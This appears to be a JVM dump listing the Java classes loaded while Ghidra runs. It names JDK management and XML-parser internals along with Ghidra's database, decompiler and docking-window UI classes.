com.sun.jmx.mbeanserver.ClassLoaderRepositorySupport$LoaderEntry[]
com.sun.jmx.mbeanserver.ConvertingMethod
com.sun.jmx.mbeanserver.DefaultMXBeanMappingFactory
com.sun.jmx.mbeanserver.DefaultMXBeanMappingFactory$ArrayMapping
com.sun.jmx.mbeanserver.DefaultMXBeanMappingFactory$CollectionMapping
com.sun.jmx.mbeanserver.DefaultMXBeanMappingFactory$CompositeMapping
com.sun.jmx.mbeanserver.DefaultMXBeanMappingFactory$EnumMapping
com.sun.jmx.mbeanserver.DefaultMXBeanMappingFactory$IdentityMapping
com.sun.jmx.mbeanserver.DefaultMXBeanMappingFactory$Mappings
com.sun.jmx.mbeanserver.DefaultMXBeanMappingFactory$NonNullMXBeanMapping
com.sun.jmx.mbeanserver.DefaultMXBeanMappingFactory$TabularMapping
com.sun.jmx.mbeanserver.DescriptorCache
com.sun.jmx.mbeanserver.DynamicMBean2
com.sun.jmx.mbeanserver.GetPropertyAction
com.sun.jmx.mbeanserver.Introspector
com.sun.jmx.mbeanserver.JmxMBeanServer
com.sun.jmx.mbeanserver.JmxMBeanServer$1
com.sun.jmx.mbeanserver.JmxMBeanServer$2
com.sun.jmx.mbeanserver.JmxMBeanServer$3
com.sun.jmx.mbeanserver.MBeanAnalyzer
com.sun.jmx.mbeanserver.MBeanAnalyzer$AttrMethods
com.sun.jmx.mbeanserver.MBeanAnalyzer$MBeanVisitor
com.sun.jmx.mbeanserver.MBeanAnalyzer$MethodOrder
com.sun.jmx.mbeanserver.MBeanInstantiator
com.sun.jmx.mbeanserver.MBeanIntrospector
com.sun.jmx.mbeanserver.MBeanIntrospector$MBeanInfoMaker
com.sun.jmx.mbeanserver.MBeanIntrospector$MBeanInfoMap
com.sun.jmx.mbeanserver.MBeanIntrospector$PerInterfaceMap
com.sun.jmx.mbeanserver.MBeanServerDelegateImpl
com.sun.jmx.mbeanserver.MBeanSupport
com.sun.jmx.mbeanserver.MXBeanIntrospector
com.sun.jmx.mbeanserver.MXBeanLookup
com.sun.jmx.mbeanserver.MXBeanMapping
com.sun.jmx.mbeanserver.MXBeanMappingFactory
com.sun.jmx.mbeanserver.MXBeanMapping[]
com.sun.jmx.mbeanserver.MXBeanSupport
com.sun.jmx.mbeanserver.ModifiableClassLoaderRepository
com.sun.jmx.mbeanserver.NamedObject
com.sun.jmx.mbeanserver.PerInterface
com.sun.jmx.mbeanserver.PerInterface$InitMaps
com.sun.jmx.mbeanserver.PerInterface$MethodAndSig
com.sun.jmx.mbeanserver.Repository
com.sun.jmx.mbeanserver.Repository$ObjectNamePattern
com.sun.jmx.mbeanserver.Repository$RegistrationContext
com.sun.jmx.mbeanserver.SecureClassLoaderRepository
com.sun.jmx.mbeanserver.StandardMBeanIntrospector
com.sun.jmx.mbeanserver.StandardMBeanSupport
com.sun.jmx.mbeanserver.SunJmxMBeanServer
com.sun.jmx.mbeanserver.Util
com.sun.jmx.mbeanserver.WeakIdentityHashMap
com.sun.jmx.mbeanserver.WeakIdentityHashMap$IdentityWeakReference
com.sun.jmx.remote.internal.rmi.RMIExporter
com.sun.jmx.remote.protocol.rmi.ServerProvider
com.sun.jmx.remote.util.ClassLogger
com.sun.jmx.remote.util.EnvHelp
com.sun.management.DiagnosticCommandMBean
com.sun.management.GarbageCollectorMXBean
com.sun.management.GcInfo
com.sun.management.HotSpotDiagnosticMXBean
com.sun.management.OperatingSystemMXBean
com.sun.management.ThreadMXBean
com.sun.management.UnixOperatingSystemMXBean
com.sun.management.VMOption
com.sun.management.internal.DiagnosticCommandArgumentInfo
com.sun.management.internal.DiagnosticCommandArgumentInfo[]
com.sun.management.internal.DiagnosticCommandImpl
com.sun.management.internal.DiagnosticCommandImpl$OperationInfoComparator
com.sun.management.internal.DiagnosticCommandImpl$Wrapper
com.sun.management.internal.DiagnosticCommandInfo
com.sun.management.internal.DiagnosticCommandInfo[]
com.sun.management.internal.GarbageCollectorExtImpl
com.sun.management.internal.HotSpotDiagnostic
com.sun.management.internal.HotSpotThreadImpl
com.sun.management.internal.OperatingSystemImpl
com.sun.management.internal.PlatformMBeanProviderImpl
com.sun.management.internal.PlatformMBeanProviderImpl$$Lambda$18.892529689
com.sun.management.internal.PlatformMBeanProviderImpl$1
com.sun.management.internal.PlatformMBeanProviderImpl$2
com.sun.management.internal.PlatformMBeanProviderImpl$3
com.sun.management.internal.PlatformMBeanProviderImpl$4
com.sun.management.internal.PlatformMBeanProviderImpl$5
com.sun.net.ssl.internal.ssl.Provider
com.sun.org.apache.xerces.internal.dom.AttrImpl
com.sun.org.apache.xerces.internal.dom.AttrNSImpl
com.sun.org.apache.xerces.internal.dom.AttributeMap
com.sun.org.apache.xerces.internal.dom.CharacterDataImpl
com.sun.org.apache.xerces.internal.dom.CharacterDataImpl$1
com.sun.org.apache.xerces.internal.dom.ChildNode
com.sun.org.apache.xerces.internal.dom.CommentImpl
com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl
com.sun.org.apache.xerces.internal.dom.DeferredAttrNSImpl
com.sun.org.apache.xerces.internal.dom.DeferredCommentImpl
com.sun.org.apache.xerces.internal.dom.DeferredDocumentImpl
com.sun.org.apache.xerces.internal.dom.DeferredDocumentImpl$RefCount
com.sun.org.apache.xerces.internal.dom.DeferredElementNSImpl
com.sun.org.apache.xerces.internal.dom.DeferredNode
com.sun.org.apache.xerces.internal.dom.DeferredTextImpl
com.sun.org.apache.xerces.internal.dom.DocumentImpl
com.sun.org.apache.xerces.internal.dom.ElementImpl
com.sun.org.apache.xerces.internal.dom.ElementNSImpl
com.sun.org.apache.xerces.internal.dom.NamedNodeMapImpl
com.sun.org.apache.xerces.internal.dom.NodeImpl
com.sun.org.apache.xerces.internal.dom.NodeListCache
com.sun.org.apache.xerces.internal.dom.ParentNode
com.sun.org.apache.xerces.internal.dom.TextImpl
com.sun.org.apache.xerces.internal.impl.Constants
com.sun.org.apache.xerces.internal.impl.Constants$ArrayEnumeration
com.sun.org.apache.xerces.internal.impl.RevalidationHandler
com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl
com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl
com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$Driver
com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$ElementStack
com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$ElementStack2
com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver
com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl
com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$ContentDriver
com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$PrologDriver
com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$TrailingMiscDriver
com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$XMLDeclDriver
com.sun.org.apache.xerces.internal.impl.XMLEntityHandler
com.sun.org.apache.xerces.internal.impl.XMLEntityManager
com.sun.org.apache.xerces.internal.impl.XMLEntityManager$EncodingInfo
com.sun.org.apache.xerces.internal.impl.XMLEntityManager$RewindableInputStream
com.sun.org.apache.xerces.internal.impl.XMLEntityScanner
com.sun.org.apache.xerces.internal.impl.XMLEntityScanner$1
com.sun.org.apache.xerces.internal.impl.XMLErrorReporter
com.sun.org.apache.xerces.internal.impl.XMLNSDocumentScannerImpl
com.sun.org.apache.xerces.internal.impl.XMLNSDocumentScannerImpl$NSContentDriver
com.sun.org.apache.xerces.internal.impl.XMLScanner
com.sun.org.apache.xerces.internal.impl.XMLScanner$NameType
com.sun.org.apache.xerces.internal.impl.XMLScanner$NameType[]
com.sun.org.apache.xerces.internal.impl.XMLVersionDetector
com.sun.org.apache.xerces.internal.impl.dtd.DTDGrammarBucket
com.sun.org.apache.xerces.internal.impl.dtd.XMLAttributeDecl
com.sun.org.apache.xerces.internal.impl.dtd.XMLDTDDescription
com.sun.org.apache.xerces.internal.impl.dtd.XMLDTDProcessor
com.sun.org.apache.xerces.internal.impl.dtd.XMLDTDValidator
com.sun.org.apache.xerces.internal.impl.dtd.XMLDTDValidatorFilter
com.sun.org.apache.xerces.internal.impl.dtd.XMLElementDecl
com.sun.org.apache.xerces.internal.impl.dtd.XMLEntityDecl
com.sun.org.apache.xerces.internal.impl.dtd.XMLNSDTDValidator
com.sun.org.apache.xerces.internal.impl.dtd.XMLSimpleType
com.sun.org.apache.xerces.internal.impl.dv.DTDDVFactory
com.sun.org.apache.xerces.internal.impl.dv.DatatypeValidator
com.sun.org.apache.xerces.internal.impl.dv.ValidationContext
com.sun.org.apache.xerces.internal.impl.dv.dtd.DTDDVFactoryImpl
com.sun.org.apache.xerces.internal.impl.dv.dtd.ENTITYDatatypeValidator
com.sun.org.apache.xerces.internal.impl.dv.dtd.IDDatatypeValidator
com.sun.org.apache.xerces.internal.impl.dv.dtd.IDREFDatatypeValidator
com.sun.org.apache.xerces.internal.impl.dv.dtd.ListDatatypeValidator
com.sun.org.apache.xerces.internal.impl.dv.dtd.NMTOKENDatatypeValidator
com.sun.org.apache.xerces.internal.impl.dv.dtd.NOTATIONDatatypeValidator
com.sun.org.apache.xerces.internal.impl.dv.dtd.StringDatatypeValidator
com.sun.org.apache.xerces.internal.impl.io.UTF8Reader
com.sun.org.apache.xerces.internal.impl.msg.XMLMessageFormatter
com.sun.org.apache.xerces.internal.impl.validation.ValidationManager
com.sun.org.apache.xerces.internal.impl.validation.ValidationState
com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl
com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl
com.sun.org.apache.xerces.internal.jaxp.JAXPConstants
com.sun.org.apache.xerces.internal.jaxp.SAXParserFactoryImpl
com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl
com.sun.org.apache.xerces.internal.jaxp.SAXParserImpl$JAXPSAXParser
com.sun.org.apache.xerces.internal.parsers.AbstractDOMParser
com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser
com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser$AttributesProxy
com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser$LocatorProxy
com.sun.org.apache.xerces.internal.parsers.AbstractXMLDocumentParser
com.sun.org.apache.xerces.internal.parsers.DOMParser
com.sun.org.apache.xerces.internal.parsers.SAXParser
com.sun.org.apache.xerces.internal.parsers.XIncludeAwareParserConfiguration
com.sun.org.apache.xerces.internal.parsers.XML11Configurable
com.sun.org.apache.xerces.internal.parsers.XML11Configuration
com.sun.org.apache.xerces.internal.parsers.XMLParser
com.sun.org.apache.xerces.internal.util.AugmentationsImpl
com.sun.org.apache.xerces.internal.util.AugmentationsImpl$AugmentationsItemsContainer
com.sun.org.apache.xerces.internal.util.AugmentationsImpl$SmallContainer
com.sun.org.apache.xerces.internal.util.ErrorHandlerWrapper
com.sun.org.apache.xerces.internal.util.FeatureState
com.sun.org.apache.xerces.internal.util.IntStack
com.sun.org.apache.xerces.internal.util.MessageFormatter
com.sun.org.apache.xerces.internal.util.NamespaceSupport
com.sun.org.apache.xerces.internal.util.ParserConfigurationSettings
com.sun.org.apache.xerces.internal.util.PropertyState
com.sun.org.apache.xerces.internal.util.SAXMessageFormatter
com.sun.org.apache.xerces.internal.util.Status
com.sun.org.apache.xerces.internal.util.Status[]
com.sun.org.apache.xerces.internal.util.SymbolTable
com.sun.org.apache.xerces.internal.util.SymbolTable$Entry
com.sun.org.apache.xerces.internal.util.SymbolTable$Entry[]
com.sun.org.apache.xerces.internal.util.URI
com.sun.org.apache.xerces.internal.util.XMLAttributesImpl
com.sun.org.apache.xerces.internal.util.XMLAttributesImpl$Attribute
com.sun.org.apache.xerces.internal.util.XMLAttributesImpl$Attribute[]
com.sun.org.apache.xerces.internal.util.XMLAttributesIteratorImpl
com.sun.org.apache.xerces.internal.util.XMLChar
com.sun.org.apache.xerces.internal.util.XMLLocatorWrapper
com.sun.org.apache.xerces.internal.util.XMLResourceIdentifierImpl
com.sun.org.apache.xerces.internal.util.XMLStringBuffer
com.sun.org.apache.xerces.internal.util.XMLSymbols
com.sun.org.apache.xerces.internal.utils.XMLLimitAnalyzer
com.sun.org.apache.xerces.internal.utils.XMLSecurityManager
com.sun.org.apache.xerces.internal.utils.XMLSecurityManager$Limit
com.sun.org.apache.xerces.internal.utils.XMLSecurityManager$Limit[]
com.sun.org.apache.xerces.internal.utils.XMLSecurityManager$NameMap
com.sun.org.apache.xerces.internal.utils.XMLSecurityManager$NameMap[]
com.sun.org.apache.xerces.internal.utils.XMLSecurityManager$State
com.sun.org.apache.xerces.internal.utils.XMLSecurityManager$State[]
com.sun.org.apache.xerces.internal.utils.XMLSecurityPropertyManager
com.sun.org.apache.xerces.internal.utils.XMLSecurityPropertyManager$Property
com.sun.org.apache.xerces.internal.utils.XMLSecurityPropertyManager$Property[]
com.sun.org.apache.xerces.internal.utils.XMLSecurityPropertyManager$State
com.sun.org.apache.xerces.internal.utils.XMLSecurityPropertyManager$State[]
com.sun.org.apache.xerces.internal.xinclude.MultipleScopeNamespaceSupport
com.sun.org.apache.xerces.internal.xinclude.XIncludeHandler
com.sun.org.apache.xerces.internal.xinclude.XIncludeMessageFormatter
com.sun.org.apache.xerces.internal.xinclude.XIncludeNamespaceSupport
com.sun.org.apache.xerces.internal.xni.Augmentations
com.sun.org.apache.xerces.internal.xni.NamespaceContext
com.sun.org.apache.xerces.internal.xni.QName
com.sun.org.apache.xerces.internal.xni.QName[]
com.sun.org.apache.xerces.internal.xni.XMLAttributes
com.sun.org.apache.xerces.internal.xni.XMLDTDContentModelHandler
com.sun.org.apache.xerces.internal.xni.XMLDTDHandler
com.sun.org.apache.xerces.internal.xni.XMLDocumentHandler
com.sun.org.apache.xerces.internal.xni.XMLLocator
com.sun.org.apache.xerces.internal.xni.XMLResourceIdentifier
com.sun.org.apache.xerces.internal.xni.XMLString
com.sun.org.apache.xerces.internal.xni.XNIException
com.sun.org.apache.xerces.internal.xni.grammars.XMLDTDDescription
com.sun.org.apache.xerces.internal.xni.grammars.XMLGrammarDescription
com.sun.org.apache.xerces.internal.xni.parser.XMLComponent
com.sun.org.apache.xerces.internal.xni.parser.XMLComponentManager
com.sun.org.apache.xerces.internal.xni.parser.XMLConfigurationException
com.sun.org.apache.xerces.internal.xni.parser.XMLDTDContentModelFilter
com.sun.org.apache.xerces.internal.xni.parser.XMLDTDContentModelSource
com.sun.org.apache.xerces.internal.xni.parser.XMLDTDFilter
com.sun.org.apache.xerces.internal.xni.parser.XMLDTDScanner
com.sun.org.apache.xerces.internal.xni.parser.XMLDTDSource
com.sun.org.apache.xerces.internal.xni.parser.XMLDocumentFilter
com.sun.org.apache.xerces.internal.xni.parser.XMLDocumentScanner
com.sun.org.apache.xerces.internal.xni.parser.XMLDocumentSource
com.sun.org.apache.xerces.internal.xni.parser.XMLEntityResolver
com.sun.org.apache.xerces.internal.xni.parser.XMLErrorHandler
com.sun.org.apache.xerces.internal.xni.parser.XMLInputSource
com.sun.org.apache.xerces.internal.xni.parser.XMLParserConfiguration
com.sun.org.apache.xerces.internal.xni.parser.XMLPullParserConfiguration
com.sun.org.apache.xerces.internal.xs.PSVIProvider
com.sun.proxy.$Proxy0
com.sun.proxy.$Proxy1
com.sun.proxy.$Proxy10
com.sun.proxy.$Proxy11
com.sun.proxy.$Proxy12
com.sun.proxy.$Proxy13
com.sun.proxy.$Proxy14
com.sun.proxy.$Proxy15
com.sun.proxy.$Proxy16
com.sun.proxy.$Proxy17
com.sun.proxy.$Proxy18
com.sun.proxy.$Proxy19
com.sun.proxy.$Proxy2
com.sun.proxy.$Proxy20
com.sun.proxy.$Proxy3
com.sun.proxy.$Proxy4
com.sun.proxy.$Proxy5
com.sun.proxy.$Proxy6
com.sun.proxy.$Proxy7
com.sun.proxy.$Proxy8
com.sun.proxy.$Proxy9
com.sun.swing.internal.plaf.basic.resources.basic
com.sun.swing.internal.plaf.metal.resources.metal
com.sun.swing.internal.plaf.synth.resources.synth
com.sun.xml.internal.stream.Entity
com.sun.xml.internal.stream.Entity$ScannedEntity
com.sun.xml.internal.stream.XMLBufferListener
com.sun.xml.internal.stream.XMLEntityStorage
com.sun.xml.internal.stream.util.BufferAllocator
com.sun.xml.internal.stream.util.ThreadLocalBufferAllocator
db.DBInitializer
db.Database
db.buffers.BufferMgr
db.buffers.LocalBufferFile$BufferFileFilter
db.util.ErrorHandler
db.util.TableColumn
decompiler.DecompilerInitializer
docking.AbstractDockingTool
docking.ActionContext
docking.AutoLookupKeyStrokeConsumer
docking.ComponentLoadedListener
docking.ComponentNode
docking.ComponentNode$$Lambda$292.1365102577
docking.ComponentNode$$Lambda$378.2144134682
docking.ComponentPlaceholder
docking.ComponentPlaceholder$$Lambda$393.2033716477
docking.ComponentProvider
docking.DefaultFocusOwnerProvider
docking.DefaultHelpService
docking.DialogComponentProvider
docking.DialogComponentProvider$$Lambda$351.366841858
docking.DialogComponentProvider$$Lambda$352.1546727377
docking.DialogComponentProvider$1
docking.DialogComponentProvider$2
docking.DialogComponentProvider$4
docking.DialogComponentProvider$PopupHandler
docking.DialogComponentProviderPopupActionManager
docking.DockWinListener
docking.DockableComponent
docking.DockableComponent$1
docking.DockableComponent$DockableComponentDropTarget
docking.DockableHeader
docking.DockableHeader$DragCursorManager
docking.DockableToolBarManager
docking.DockableToolBarManager$$Lambda$380.637310014
docking.DockableToolBarManager$$Lambda$382.606158203
docking.DockableToolBarManager$ToolBarCloseAction
docking.DockableToolBarManager$ToolBarMenuAction
docking.DockingActionManager
docking.DockingActionProxy
docking.DockingContextListener
docking.DockingDialog
docking.DockingDialog$$Lambda$386.1362667975
docking.DockingDialog$$Lambda$387.1426585811
docking.DockingDialog$1
docking.DockingDialog$2
docking.DockingDialog$BoundsInfo
docking.DockingErrorDisplay
docking.DockingFrame
docking.DockingKeyBindingAction
docking.DockingMenuItem
docking.DockingTool
docking.DockingUtils
docking.DockingWindowListener
docking.DockingWindowManager
docking.DockingWindowManager$$Lambda$274.1410028668
docking.DockingWindowManager$$Lambda$379.1416414808
docking.DockingWindowManager$$Lambda$383.1379726728
docking.DockingWindowManager$$Lambda$385.915906849
docking.DockingWindowManager$$Lambda$390.37353321
docking.DockingWindowManager$$Lambda$395.223553348
docking.DockingWindowManager$1
docking.DockingWindowManager$ActivatedInfo
docking.DockingWindowsContextSensitiveHelpListener
docking.DockingWindowsContextSensitiveHelpListener$1
docking.EmptyBorderToggleButton
docking.EmptyBorderToggleButton$$Lambda$359.844340412
docking.EmptyBorderToggleButton$$Lambda$360.1667437439
docking.ErrLogDialog
docking.FocusOwnerProvider
docking.GenericHeader
docking.GenericHeader$1
docking.GenericHeader$2
docking.GenericHeader$TitlePanel
docking.GlobalMenuAndToolBarManager
docking.KeyBindingOverrideKeyEventDispatcher
docking.KeyBindingPrecedence
docking.KeyBindingPrecedence[]
docking.KeyBindingsManager
docking.KeyStrokeConsumer
docking.MenuBarMenuHandler
docking.Node
docking.PlaceholderInstaller
docking.PlaceholderManager
docking.PlaceholderSet
docking.PopupActionManager
docking.ReservedKeyBindingAction
docking.RootNode
docking.RootNode$JFrameWindowWrapper
docking.RootNode$JFrameWindowWrapper$1
docking.RootNode$SwingWindowWrapper
docking.StatusBarSpacer
docking.TaskScheduler
docking.ToolTipManager
docking.WindowActionManager
docking.WindowActionManager$$Lambda$276.1827453515
docking.WindowNode
docking.WindowPosition
docking.WindowPosition[]
docking.action.ActionContextProvider
docking.action.DockingAction
docking.action.DockingActionIf
docking.action.DockingActionProviderIf
docking.action.HelpAction
docking.action.KeyBindingAction
docking.action.KeyBindingData
docking.action.MenuBarData
docking.action.MenuData
docking.action.MultiActionDockingActionIf
docking.action.MultipleKeyAction
docking.action.MultipleKeyAction$ActionData
docking.action.PopupMenuData
docking.action.ToggleDockingAction
docking.action.ToggleDockingActionIf
docking.action.ToolBarData
docking.actions.DockingToolActionManager
docking.dnd.GenericDataFlavor
docking.event.mouse.GMouseListenerAdapter
docking.framework.ApplicationInformationDisplayFactory
docking.framework.SplashScreen
docking.framework.SplashScreen$$Lambda$251.1285789917
docking.framework.SplashScreen$1
docking.framework.SplashScreen$2
docking.help.CustomFavoritesView
docking.help.CustomSearchView
docking.help.CustomTOCView
docking.help.GHelpBroker
docking.help.GHelpBroker$HelpIDChangedListener
docking.help.GHelpBroker$PageLoadingListener
docking.help.GHelpClassLoader
docking.help.GHelpSet
docking.help.GHelpSet$GHelpMap
docking.help.Help
docking.help.HelpDescriptor
docking.help.HelpManager
docking.help.HelpService
docking.menu.ActionState
docking.menu.DockingMenuItemUI
docking.menu.DockingMenuUI
docking.menu.ManagedMenuItem
docking.menu.MenuBarManager
docking.menu.MenuGroupListener
docking.menu.MenuGroupMap
docking.menu.MenuHandler
docking.menu.MenuItemManager
docking.menu.MenuItemManager$$Lambda$290.1227133101
docking.menu.MenuItemManager$2
docking.menu.MenuManager
docking.menu.MenuManager$GroupComparator
docking.menu.MenuManager$ManagedMenuItemComparator
docking.menu.MultiStateDockingAction
docking.menu.MultiStateDockingAction$$Lambda$338.627728249
docking.menu.MultiStateDockingAction$$Lambda$339.2049433995
docking.menu.MultiStateDockingAction$$Lambda$340.856647924
docking.menu.MultipleActionDockingToolbarButton
docking.menu.MultipleActionDockingToolbarButton$IconWithDropDownArrow
docking.menu.MultipleActionDockingToolbarButton$PopupMouseListener
docking.menu.NonToolbarMultiStateAction
docking.menu.ToolBarItemManager
docking.menu.ToolBarManager
docking.menu.ToolBarManager$GroupComparator
docking.menu.ToolBarManager$ToolBarItemManagerComparator
docking.options.editor.EditorInitializer
docking.options.editor.StringWithChoicesEditor
docking.util.ActionAdapter
docking.util.AnimatedIcon
docking.util.AnimatedIcon$1
docking.util.GraphicsUtils
docking.util.KeyBindingUtils
docking.util.KeyBindingUtils$1
docking.util.MultiIcon
docking.widgets.AbstractGCellRenderer
docking.widgets.DropDownSelectionChoiceListener
docking.widgets.DropDownSelectionTextField
docking.widgets.DropDownTextField
docking.widgets.DropDownTextField$$Lambda$369.324858894
docking.widgets.DropDownTextField$HideWindowFocusListener
docking.widgets.DropDownTextField$InternalKeyListener
docking.widgets.DropDownTextField$ListSelectionMouseListener
docking.widgets.DropDownTextField$PreviewListener
docking.widgets.DropDownTextField$UpdateCaretListener
docking.widgets.DropDownTextField$UpdateDocumentListener
docking.widgets.DropDownTextField$WindowComponentListener
docking.widgets.DropDownTextFieldDataModel
docking.widgets.DropDownWindowVisibilityListener
docking.widgets.EmptyBorderButton
docking.widgets.EmptyBorderButton$ButtonStateListener
docking.widgets.EventTrigger
docking.widgets.EventTrigger[]
docking.widgets.GenericDateCellRenderer
docking.widgets.HyperlinkComponent
docking.widgets.HyperlinkComponent$1
docking.widgets.HyperlinkComponent$NonScrollingCaret
docking.widgets.JTreeMouseListenerDelegate
docking.widgets.MultiLineLabel
docking.widgets.PopupKeyStorePasswordProvider
docking.widgets.SingleRowLayoutManager
docking.widgets.VariableHeightLayoutManager
docking.widgets.VariableHeightPanel
docking.widgets.VariableHeightPanel$1
docking.widgets.conditiontestpanel.ConditionTester
docking.widgets.fieldpanel.support.Highlight[]
docking.widgets.filechooser.DirectoryList
docking.widgets.filechooser.DirectoryList$$Lambda$368.1795220910
docking.widgets.filechooser.DirectoryList$1
docking.widgets.filechooser.DirectoryList$2
docking.widgets.filechooser.DirectoryList$3
docking.widgets.filechooser.DirectoryList$4
docking.widgets.filechooser.DirectoryList$5
docking.widgets.filechooser.DirectoryList$6
docking.widgets.filechooser.DirectoryListModel
docking.widgets.filechooser.DirectoryTable
docking.widgets.filechooser.DirectoryTable$$Lambda$367.762378768
docking.widgets.filechooser.DirectoryTable$1
docking.widgets.filechooser.DirectoryTable$2
docking.widgets.filechooser.DirectoryTable$3
docking.widgets.filechooser.DirectoryTable$FileSizeRenderer
docking.widgets.filechooser.DirectoryTableModel
docking.widgets.filechooser.FileChooserActionManager
docking.widgets.filechooser.FileChooserActionManager$1
docking.widgets.filechooser.FileChooserActionManager$2
docking.widgets.filechooser.FileChooserToggleButton
docking.widgets.filechooser.FileChooserToggleButton$1
docking.widgets.filechooser.FileChooserToggleButton$ButtonMouseListener
docking.widgets.filechooser.FileComparator
docking.widgets.filechooser.FileDropDownSelectionDataModel
docking.widgets.filechooser.FileDropDownSelectionDataModel$FileComparator
docking.widgets.filechooser.FileDropDownSelectionDataModel$FileDropDownRenderer
docking.widgets.filechooser.FileDropDownSelectionDataModel$FileSearchComparator
docking.widgets.filechooser.FileEditor
docking.widgets.filechooser.FileEditor$1
docking.widgets.filechooser.FileEditor$2
docking.widgets.filechooser.FileEditor$3
docking.widgets.filechooser.FileListCellRenderer
docking.widgets.filechooser.FileTableCellRenderer
docking.widgets.filechooser.GFileChooserOptionsDialog
docking.widgets.filechooser.GhidraFile
docking.widgets.filechooser.GhidraFileChooser
docking.widgets.filechooser.GhidraFileChooser$$Lambda$350.56893809
docking.widgets.filechooser.GhidraFileChooser$$Lambda$353.558582930
docking.widgets.filechooser.GhidraFileChooser$$Lambda$354.957749913
docking.widgets.filechooser.GhidraFileChooser$$Lambda$356.1758458109
docking.widgets.filechooser.GhidraFileChooser$$Lambda$357.996900691
docking.widgets.filechooser.GhidraFileChooser$$Lambda$358.1122136177
docking.widgets.filechooser.GhidraFileChooser$$Lambda$361.147009258
docking.widgets.filechooser.GhidraFileChooser$$Lambda$362.1566110317
docking.widgets.filechooser.GhidraFileChooser$$Lambda$363.1947780906
docking.widgets.filechooser.GhidraFileChooser$$Lambda$364.663073850
docking.widgets.filechooser.GhidraFileChooser$$Lambda$365.744272542
docking.widgets.filechooser.GhidraFileChooser$$Lambda$366.257708415
docking.widgets.filechooser.GhidraFileChooser$$Lambda$370.1911861180
docking.widgets.filechooser.GhidraFileChooser$$Lambda$371.1440263086
docking.widgets.filechooser.GhidraFileChooser$$Lambda$372.1974099554
docking.widgets.filechooser.GhidraFileChooser$$Lambda$373.1827772934
docking.widgets.filechooser.GhidraFileChooser$1
docking.widgets.filechooser.GhidraFileChooser$10
docking.widgets.filechooser.GhidraFileChooser$11
docking.widgets.filechooser.GhidraFileChooser$12
docking.widgets.filechooser.GhidraFileChooser$2
docking.widgets.filechooser.GhidraFileChooser$3
docking.widgets.filechooser.GhidraFileChooser$4
docking.widgets.filechooser.GhidraFileChooser$5
docking.widgets.filechooser.GhidraFileChooser$6
docking.widgets.filechooser.GhidraFileChooser$7
docking.widgets.filechooser.GhidraFileChooser$8
docking.widgets.filechooser.GhidraFileChooser$9
docking.widgets.filechooser.GhidraFileChooser$FileChooserJob
docking.widgets.filechooser.GhidraFileChooser$FileChooserJob$$Lambda$374.1252465030
docking.widgets.filechooser.GhidraFileChooser$FileList
docking.widgets.filechooser.GhidraFileChooser$SelectionListener
docking.widgets.filechooser.GhidraFileChooser$SetSelectedFileJob
docking.widgets.filechooser.GhidraFileChooser$UnselectableButtonGroup
docking.widgets.filechooser.GhidraFileChooser$UpdateDirectoryContentsJob
docking.widgets.filechooser.GhidraFileChooserDirectoryModelIf
docking.widgets.filechooser.GhidraFileChooserMode
docking.widgets.filechooser.GhidraFileChooserMode[]
docking.widgets.filechooser.LocalFileChooserModel
docking.widgets.filechooser.LocalFileChooserModel$FileDescriptionThread
docking.widgets.filter.ClearFilterLabel
docking.widgets.filter.ClearFilterLabel$$Lambda$392.77819313
docking.widgets.filter.ClearFilterLabel$1
docking.widgets.filter.ClearFilterLabel$2
docking.widgets.filter.ClearFilterLabel$3
docking.widgets.filter.ContainsTextFilterFactory
docking.widgets.filter.FilterListener
docking.widgets.filter.FilterOptions
docking.widgets.filter.FilterOptions$$Lambda$295.1111562048
docking.widgets.filter.FilterOptions$1
docking.widgets.filter.FilterTextField
docking.widgets.filter.FilterTextField$$Lambda$300.382007511
docking.widgets.filter.FilterTextField$1
docking.widgets.filter.FilterTextField$2
docking.widgets.filter.FilterTextField$BackgroundFlashTimer
docking.widgets.filter.FilterTextField$FilterDocumentListener
docking.widgets.filter.FilterTextField$FlashFocusListener
docking.widgets.filter.FilterTextField$TraversalKeyListener
docking.widgets.filter.MultitermEvaluationMode
docking.widgets.filter.MultitermEvaluationMode[]
docking.widgets.filter.TextFilterFactory
docking.widgets.filter.TextFilterStrategy
docking.widgets.filter.TextFilterStrategy[]
docking.widgets.list.GList
docking.widgets.list.GList$1
docking.widgets.list.GList$2
docking.widgets.table.AbstractDynamicTableColumn
docking.widgets.table.AbstractDynamicTableColumnStub
docking.widgets.table.AbstractGTableModel
docking.widgets.table.AbstractSortedTableModel
docking.widgets.table.AbstractSortedTableModel$ComparatorLink
docking.widgets.table.AbstractSortedTableModel$EndOfChainComparator
docking.widgets.table.AutoscrollAdapter
docking.widgets.table.ColumnSortState
docking.widgets.table.ColumnSortState$SortDirection
docking.widgets.table.ColumnSortState$SortDirection[]
docking.widgets.table.CombinedTableFilter
docking.widgets.table.ConfigurableColumnTableModel
docking.widgets.table.DefaultRowFilterTransformer
docking.widgets.table.DefaultTableCellRendererWrapper
docking.widgets.table.DefaultTableTextFilterFactory
docking.widgets.table.DiscoverableTableUtils
docking.widgets.table.DisplayStringProvider
docking.widgets.table.DynamicColumnTableModel
docking.widgets.table.DynamicTableColumn
docking.widgets.table.DynamicTableColumnExtensionPoint
docking.widgets.table.GBooleanCellRenderer
docking.widgets.table.GDynamicColumnTableModel
docking.widgets.table.GFilterTable
docking.widgets.table.GFilterTable$$Lambda$334.1915758109
docking.widgets.table.GTable
docking.widgets.table.GTable$$Lambda$332.1707183254
docking.widgets.table.GTable$1
docking.widgets.table.GTable$10
docking.widgets.table.GTable$2
docking.widgets.table.GTable$3
docking.widgets.table.GTable$5
